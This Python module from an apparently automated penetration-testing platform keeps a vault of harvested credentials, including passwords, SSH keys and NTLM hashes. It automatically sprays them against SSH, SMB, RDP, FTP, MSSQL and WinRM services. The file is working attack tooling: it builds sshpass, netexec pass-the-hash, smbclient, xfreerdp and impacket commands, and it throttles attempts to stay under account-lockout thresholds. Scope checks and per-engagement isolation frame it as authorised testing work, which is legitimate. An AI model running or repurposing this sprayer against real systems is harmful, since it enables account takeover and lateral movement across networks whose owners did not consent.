"""
credential_pipeline.py - centralised credential vault + auto-spray.

Why this exists
---------------
When a credential lands in ARGUS state (ssh key from a backup, NTLM hash
from a config file, db password from a heap dump), the operator-level
question is always the same: does this credential work anywhere ELSE in
scope?  Without an answer to that, the find-then-forget loop wastes the
most valuable signal a scan produces.

This module wires that loop:

  1. ingest(cred)               - the agent that found it calls this
  2. registry stays in memory   - keyed by cred fingerprint, with
                                  provenance (who found it where)
  3. spray(scope_hosts, runner) - try the cred against every reachable
                                  auth surface (SSH, SMB, RDP, FTP,
                                  web logins) on hosts inside scope
  4. on success                 - new finding emitted with the host
                                  it cracked, original provenance
                                  preserved

Scope safety
------------
Spray ONLY targets hosts the caller passes in `scope_hosts`.  Out-of-
scope hosts can never be hit, regardless of what other intel ARGUS has
collected.  This is the same scope-guard pattern used by the rest of
the platform.

Rate limiting
-------------
A token bucket caps spray attempts at CREDPIPE_RATE_PER_SEC (default 2)
to keep below typical account-lockout thresholds.  Override via env
for engagement-specific tuning.

Transport
---------
Like the playbook engine, this module takes an injected `tool_runner`
coroutine - it doesn't fork its own subprocesses.  Same runner that
handles MCP/local tools handles spray attempts.  This keeps the
audit trail consistent.
"""
from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import re
import time
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ── Tunables ─────────────────────────────────────────────────────────────
CRED_RATE_PER_SEC = float(os.environ.get("CREDPIPE_RATE_PER_SEC", "2.0"))
CRED_MAX_PARALLEL = int(os.environ.get("CREDPIPE_MAX_PARALLEL", "4"))
CRED_SPRAY_TIMEOUT = int(os.environ.get("CREDPIPE_SPRAY_TIMEOUT", "10"))


# ── Models ───────────────────────────────────────────────────────────────

CRED_TYPES = (
    "password",      # plaintext user/pass
    "ssh_key",       # private key contents
    "ntlm_hash",     # NT hash
    "kerberos_tgt",  # ccache blob
    "api_token",     # bearer / oauth token
    "db_dsn",        # full DB connection string
)


@dataclass
class Credential:
    cred_type:   str                            # one of CRED_TYPES
    username:    Optional[str] = None
    password:    Optional[str] = None
    secret:      Optional[str] = None            # key blob, hash, token, dsn
    domain:      Optional[str] = None
    source_host: Optional[str] = None            # where ARGUS found it
    source_path: Optional[str] = None            # file path / endpoint
    source_finding_id: Optional[str] = None
    discovered_at: float = field(default_factory=time.time)
    notes:       str = ""

    def fingerprint(self) -> str:
        """Stable hash for dedup.  Identical creds -> same fingerprint."""
        parts = [
            self.cred_type or "",
            (self.username or "").lower(),
            self.password or "",
            self.secret or "",
            (self.domain or "").lower(),
        ]
        return hashlib.sha256("\x1f".join(parts).encode("utf-8",
                                                       errors="replace")).hexdigest()[:24]

    def display(self) -> str:
        if self.cred_type == "password":
            return f"{self.username}:{self.password}"
        if self.cred_type == "ssh_key":
            return f"ssh_key for {self.username or '?'} ({len(self.secret or '')}b)"
        if self.cred_type == "ntlm_hash":
            return f"{self.username}:::{(self.secret or '')[:32]}..."
        if self.cred_type == "api_token":
            return f"token {(self.secret or '')[:12]}..."
        return f"{self.cred_type}: {(self.secret or self.password or '?')[:30]}"


@dataclass
class SprayHit:
    credential:  Credential
    host:        str
    port:        int
    service:     str         # ssh / smb / rdp / ftp / http / mssql / mysql / postgres
    detail:      str = ""    # extra context (uri, share name, etc.)
    ts:          float = field(default_factory=time.time)


# ── Vault ────────────────────────────────────────────────────────────────

class CredentialVault:
    """In-memory + WS-event credential store with auto-spray hooks.

    Lifecycle:
      ingest(cred, on_event)         async    - dedup, persist, emit
      pending_for_spray()                     - creds not yet sprayed
      mark_sprayed(fingerprint, scope_hosts)  - after spray() completes
      spray(creds, scope, runner)    async    - rate-limited spray
    """

    def __init__(self) -> None:
        self._creds: Dict[str, Credential] = {}                 # fp -> cred
        self._sprayed_targets: Dict[str, set] = {}              # fp -> {host:port:svc}
        self._hits: List[SprayHit] = []
        self._lock = asyncio.Lock()
        self._rate_tokens = CRED_RATE_PER_SEC
        self._rate_ts = time.monotonic()

    async def ingest(
        self,
        cred: Credential,
        on_event: Optional[Callable[[str, Dict[str, Any]], Awaitable[None]]] = None,
    ) -> Tuple[bool, str]:
        """Add a credential to the vault.

        Returns (was_new, fingerprint).  If was_new is False, the cred
        was already known (no duplicate event fired).
        """
        fp = cred.fingerprint()
        async with self._lock:
            if fp in self._creds:
                return False, fp
            self._creds[fp] = cred
            self._sprayed_targets.setdefault(fp, set())
        if on_event is not None:
            try:
                await on_event("credential_ingested", {
                    "fingerprint": fp,
                    "type":        cred.cred_type,
                    "username":    cred.username,
                    "domain":      cred.domain,
                    "source_host": cred.source_host,
                    "source_path": cred.source_path,
                    "display":     cred.display(),
                })
            except Exception:
                pass
        return True, fp

    def all(self) -> List[Credential]:
        return list(self._creds.values())

    def hits(self) -> List[SprayHit]:
        return list(self._hits)

    def pending_for_host(self, host: str, port: int, service: str) -> List[Credential]:
        """Return creds NOT yet sprayed against a given (host, port, service)."""
        key = f"{host}:{port}:{service}"
        out: List[Credential] = []
        for fp, cred in self._creds.items():
            if key not in self._sprayed_targets.get(fp, set()):
                out.append(cred)
        return out

    async def _rate_wait(self) -> None:
        """Token-bucket: leak at CRED_RATE_PER_SEC, sleep if empty."""
        while True:
            now = time.monotonic()
            elapsed = now - self._rate_ts
            self._rate_ts = now
            self._rate_tokens = min(CRED_RATE_PER_SEC * 2,
                                    self._rate_tokens + elapsed * CRED_RATE_PER_SEC)
            if self._rate_tokens >= 1.0:
                self._rate_tokens -= 1.0
                return
            await asyncio.sleep(0.1)

    async def spray(
        self,
        creds: List[Credential],
        targets: List[Tuple[str, int, str]],
        tool_runner: Callable[[str, List[str], int], Awaitable[Tuple[int, str, str]]],
        on_event: Optional[Callable[[str, Dict[str, Any]], Awaitable[None]]] = None,
        scope_hosts: Optional[set] = None,
    ) -> List[SprayHit]:
        """Try each cred against each compatible target.

        targets:   list of (host, port, service) tuples
        scope_hosts: REQUIRED enforcement set; hosts not in here are skipped
                     regardless of how they got into `targets`.

        Returns the list of new SprayHits this call produced.
        """
        new_hits: List[SprayHit] = []
        sem = asyncio.Semaphore(CRED_MAX_PARALLEL)

        async def _attempt(cred: Credential, host: str, port: int, service: str) -> None:
            if scope_hosts is not None and host not in scope_hosts:
                return
            key = f"{host}:{port}:{service}"
            if key in self._sprayed_targets.get(cred.fingerprint(), set()):
                return
            # Mark sprayed BEFORE the attempt so a crash doesn't replay
            self._sprayed_targets.setdefault(cred.fingerprint(), set()).add(key)

            argv = self._build_attempt_argv(cred, host, port, service)
            if argv is None:
                return  # incompatible cred/service pairing

            await self._rate_wait()
            async with sem:
                try:
                    exit_code, stdout, stderr = await tool_runner(
                        argv[0], argv[1:], CRED_SPRAY_TIMEOUT,
                    )
                except Exception as exc:
                    logger.debug("[cred] spray attempt error %s@%s:%s: %s",
                                 cred.username, host, port, exc)
                    return

                if self._attempt_succeeded(service, exit_code, stdout, stderr):
                    hit = SprayHit(
                        credential = cred,
                        host       = host,
                        port       = port,
                        service    = service,
                        detail     = (stdout or "")[:200],
                    )
                    self._hits.append(hit)
                    new_hits.append(hit)
                    if on_event is not None:
                        try:
                            await on_event("credential_spray_hit", {
                                "fingerprint": cred.fingerprint(),
                                "username":    cred.username,
                                "host":        host,
                                "port":        port,
                                "service":     service,
                                "display":     cred.display(),
                            })
                        except Exception:
                            pass

        tasks: List[asyncio.Task] = []
        for cred in creds:
            for host, port, service in targets:
                tasks.append(asyncio.create_task(_attempt(cred, host, port, service)))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        return new_hits

    # ── Per-service attempt builders ────────────────────────────────────
    @staticmethod
    def _build_attempt_argv(cred: Credential, host: str, port: int,
                            service: str) -> Optional[List[str]]:
        """Construct argv for a single auth attempt.

        Uses tools commonly available in pentest distros (Kali ships all
        of these).  Each returns exit code 0 on success.
        """
        svc = (service or "").lower()
        if svc == "ssh" and cred.cred_type == "password" and cred.username and cred.password:
            # sshpass + ssh in BatchMode (no host key prompt)
            return ["sshpass", "-p", cred.password,
                    "ssh",
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null",
                    "-o", "BatchMode=yes",
                    "-o", "ConnectTimeout=5",
                    "-p", str(port),
                    f"{cred.username}@{host}", "id"]
        if svc == "ssh" and cred.cred_type == "ssh_key" and cred.username and cred.secret:
            # Operator is responsible for materialising the key on disk;
            # use the source_path if it points at an existing file, else skip.
            if cred.source_path and os.path.isfile(cred.source_path):
                return ["ssh",
                        "-o", "StrictHostKeyChecking=no",
                        "-o", "UserKnownHostsFile=/dev/null",
                        "-o", "BatchMode=yes",
                        "-o", "ConnectTimeout=5",
                        "-i", cred.source_path,
                        "-p", str(port),
                        f"{cred.username}@{host}", "id"]
            return None
        if svc == "smb" and cred.cred_type == "password" and cred.username and cred.password:
            return ["smbclient", "-L", f"//{host}/",
                    "-U", f"{cred.domain or '.'}/{cred.username}%{cred.password}",
                    "--option=client min protocol=NT1"]
        if svc == "smb" and cred.cred_type == "ntlm_hash" and cred.username and cred.secret:
            # Use the NT hash via crackmapexec / netexec
            return ["nxc", "smb", host,
                    "-u", cred.username,
                    "-H", cred.secret,
                    "--shares"]
        if svc == "ftp" and cred.cred_type == "password" and cred.username and cred.password:
            # `curl -u user:pass ftp://host:port/` returns 0 on auth success
            return ["curl", "-s", "--max-time", str(CRED_SPRAY_TIMEOUT),
                    "-u", f"{cred.username}:{cred.password}",
                    f"ftp://{host}:{port}/"]
        if svc == "rdp" and cred.cred_type == "password" and cred.username and cred.password:
            # xfreerdp / rdesktop in non-interactive mode
            return ["xfreerdp",
                    "/cert:ignore",
                    "/auth-only",
                    "/timeout:5000",
                    f"/v:{host}:{port}",
                    f"/u:{cred.username}",
                    f"/p:{cred.password}"]
        if svc == "mssql" and cred.cred_type == "password" and cred.username and cred.password:
            return ["impacket-mssqlclient",
                    f"{cred.username}:{cred.password}@{host}",
                    "-port", str(port),
                    "-windows-auth" if cred.domain else "-no-pass"]
        if svc == "winrm" and cred.cred_type == "password" and cred.username and cred.password:
            return ["nxc", "winrm", host,
                    "-u", cred.username,
                    "-p", cred.password,
                    "--no-output"]
        return None

    @staticmethod
    def _attempt_succeeded(service: str, exit_code: int, stdout: str, stderr: str) -> bool:
        """Heuristic per service: exit==0 + corroborating substring."""
        if exit_code != 0:
            return False
        svc = (service or "").lower()
        if svc == "ssh":
            return "uid=" in stdout or "GNU" in stdout or stdout.strip() != ""
        if svc == "smb":
            return ("Sharename" in stdout) or ("Disk" in stdout)
        if svc == "ftp":
            return True  # curl exits 0 only on successful auth + connection
        if svc == "rdp":
            return True
        if svc == "mssql":
            return ">" in stdout or "SQL" in stdout
        if svc == "winrm":
            # nxc prints "[+]" on success
            return "[+]" in stdout or "Pwn3d" in stdout
        return True


# ── Spray planning (pure) ─────────────────────────────────────────────────
# Ports / service-names that expose a credential auth surface the vault can spray.
_AUTH_PORTS = {21: "ftp", 22: "ssh", 139: "smb", 445: "smb", 1433: "mssql",
               3389: "rdp", 5985: "winrm", 5986: "winrm"}
_AUTH_SVCNAMES = {
    "ssh": "ssh", "ftp": "ftp", "smb": "smb", "microsoft-ds": "smb",
    "netbios-ssn": "smb", "ms-wbt-server": "rdp", "rdp": "rdp",
    "ms-sql-s": "mssql", "mssql": "mssql", "winrm": "winrm", "wsman": "winrm",
}


def _cred_from_intel(c: Dict[str, Any]) -> Optional["Credential"]:
    """Adapt a loose ARGUS intel credential dict into a typed Credential.
    Returns None for a cred with nothing sprayable (e.g. a bare note)."""
    if not isinstance(c, dict):
        return None
    user = c.get("user") or c.get("username")
    pwd = c.get("password") or c.get("pass")
    secret = c.get("secret") or c.get("hash")
    ctype = str(c.get("type") or "").lower()
    if ctype not in CRED_TYPES:
        ctype = "password" if pwd else ("ntlm_hash" if secret else "password")
    if ctype == "password" and not (user and pwd):
        return None
    if ctype in ("ssh_key", "ntlm_hash", "api_token", "db_dsn") and not secret:
        return None
    return Credential(cred_type=ctype, username=user, password=pwd, secret=secret,
                      domain=c.get("domain"),
                      source_host=c.get("source_host") or c.get("host"),
                      source_path=c.get("source_path"),
                      notes=str(c.get("note") or ""))


def spray_plan(intel: Dict[str, Any],
               scope_hosts: Optional[set] = None
               ) -> Tuple[List["Credential"], List[Tuple[str, int, str]]]:
    """From ARGUS intel, derive (sprayable creds, auth targets) so a recovered
    credential can be re-used across the in-scope auth surface — the pivot that
    turns 'found a cred' into 'confirmed reuse / foothold'.  Pure + defensive.

    Scope-safe: a host is only ever a target when it is in ``scope_hosts`` (or
    scope_hosts is None → single-host intel, the intel's own target)."""
    intel = intel or {}
    creds: List[Credential] = []
    for c in (intel.get("credentials") or []):
        cred = _cred_from_intel(c)
        if cred is not None:
            creds.append(cred)

    host = str(intel.get("target_host") or intel.get("target_ip")
               or intel.get("web_host") or intel.get("target") or "").strip()
    if host.startswith("http"):
        host = re.sub(r"^https?://", "", host).split("/")[0].split(":")[0]
    targets: List[Tuple[str, int, str]] = []
    seen: set = set()

    def _add(h: str, port: int, svc: str) -> None:
        if not h or not svc:
            return
        if scope_hosts is not None and h not in scope_hosts:
            return
        key = (h, int(port), svc)
        if key not in seen:
            seen.add(key)
            targets.append((h, int(port), svc))

    svcs = intel.get("services")
    if isinstance(svcs, dict):
        for port, meta in svcs.items():
            try:
                p = int(str(port))
            except (TypeError, ValueError):
                continue
            name = str((meta or {}).get("service") or "").lower() if isinstance(meta, dict) else ""
            _add(host, p, _AUTH_SVCNAMES.get(name) or _AUTH_PORTS.get(p, ""))
    for p in (intel.get("open_ports") or []):
        try:
            pi = int(str(p))
        except (TypeError, ValueError):
            continue
        _add(host, pi, _AUTH_PORTS.get(pi, ""))
    return creds, targets


# ── Singleton accessor ───────────────────────────────────────────────────

# One vault PER ENGAGEMENT.  This was a single process-wide instance shared by
# every agent and every session, so credentials harvested from one client stayed
# live in memory — and sprayable — throughout the next client's engagement.  A
# recovered credential is the most sensitive thing ARGUS holds and the least
# transferable: it is worthless against a different client and catastrophic if
# offered to one.  Keyed by session, dropped when the engagement ends.
_VAULTS: Dict[str, CredentialVault] = {}

#: Bucket used when a caller has no session in hand.  Kept so legacy call sites
#: keep working, but it is NOT shared with any real engagement.
_UNSCOPED = "__unscoped__"


def get_vault(session_id: Optional[str] = None) -> CredentialVault:
    """Return the vault for ONE engagement.

    Callers that know their session must pass it; anything else lands in an
    isolated unscoped bucket rather than in another engagement's vault.
    """
    key = str(session_id or _UNSCOPED)
    v = _VAULTS.get(key)
    if v is None:
        v = _VAULTS[key] = CredentialVault()
    return v


def drop_vault(session_id: Optional[str] = None) -> bool:
    """Forget an engagement's credentials.  Call at engagement teardown.

    Returns True when a vault was actually discarded.
    """
    return _VAULTS.pop(str(session_id or _UNSCOPED), None) is not None


def vault_sessions() -> List[str]:
    """Session keys currently holding credentials — for teardown assertions."""
    return sorted(_VAULTS.keys())


__all__ = [
    "Credential", "SprayHit", "CredentialVault", "get_vault", "drop_vault",
    "vault_sessions", "CRED_TYPES", "spray_plan",
]
